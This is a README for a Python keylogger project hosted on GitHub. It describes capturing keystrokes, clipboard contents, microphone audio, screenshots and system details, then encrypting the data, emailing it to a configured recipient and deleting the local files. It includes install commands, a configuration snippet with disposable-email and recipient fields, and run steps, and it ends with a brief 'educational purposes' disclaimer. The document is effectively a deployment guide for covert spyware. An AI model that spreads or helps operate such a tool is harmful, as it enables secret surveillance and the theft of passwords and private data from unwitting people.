# Advanced Keylogger in Python

This project is an advanced keylogger implemented in Python. It captures keystrokes, system information, clipboard contents, audio recordings, and screenshots. The captured data is then sent to a specified email address and encrypted for security. This project is implemented using a jupyter notebook but can also be converted into a python executable using a package called PyInstaller

## Features

- Keystroke Logging: Captures all keystrokes and logs them into a file.
- System Information: Collects and logs information about the system.
- Clipboard Capture: Logs the current contents of the clipboard.
- Microphone Recording: Records audio for a specified duration.
- Screenshots: Captures and saves screenshots.
- Email Sending: Sends the captured data to a specified email address.
- Encryption: Encrypts the captured data before sending it via email.
- File Cleanup: Deletes the captured files after sending them.

## Setup
1. Install the required libraries:

    ```bash
    pip install pynput scipy sounddevice cryptography pillow pypiwin32 requests

2. Clone the repository:

    ```bash
    git clone https://github.com/IIIIIGODIIIII/Advanced_KeyLogger.git

3. Edit the configuration:
   Open the KeyLogger.ipynb file and update the following variables with your details:

    ```python
    email_address = "your_disposable_email@example.com"  # Enter disposable email here or use an API key for temp mail
    password = "your_email_password"  # Enter email password here (if using an API the no need)
    toaddr = "recipient_email@example.com"  # Enter the email address you want to send your information to
    key = "your_encryption_key"   # Generate an encryption key from the Cryptography folder
    file_path = "your_file_path"  # Enter the file path you want your files to be saved to

4. Generate an encryption key:
   Simpy execute the Generate_Key.py to generate an encryption key

## Usage
1. Simply execute all cells of the KeyLogger.ipynb file.
2. The keylogger will start capturing keystrokes, system information, clipboard contents, audio recordings, and screenshots. It will send the captured data to the specified email address after the specified time interval.
3. To open the encrypted files simplpy run Decrypt_File.py.

## Code Explanation
1. Email Sending Function:
The send_email function sends the captured data as an email attachment to the specified email address.

2. Computer Information Function:
The computer_information function captures and logs information about the system, such as the processor, system, machine, hostname, and IP addresses.

3. Clipboard Capture Function:
The copy_clipboard function captures and logs the current contents of the clipboard.

4. Microphone Recording Function:
The microphone function records audio for a specified duration and saves it to a file.

5. Screenshot Capture Function:
The screenshot function captures and saves a screenshot.

6. Keylogger:
The keylogger captures keystrokes and logs them into a file. It stops recording when the 'ESC' key is pressed or after a specified time interval.

7. Encryption:
The captured files are encrypted using the Fernet encryption method before being sent via email.

8. File Cleanup:
The captured files are deleted after they have been sent via email.

## Disclaimer
This project is for educational purposes only. Use it responsibly and ensure you have permission to monitor and capture data on any system you deploy it on. Unauthorized use of this software may violate privacy and legal regulations.

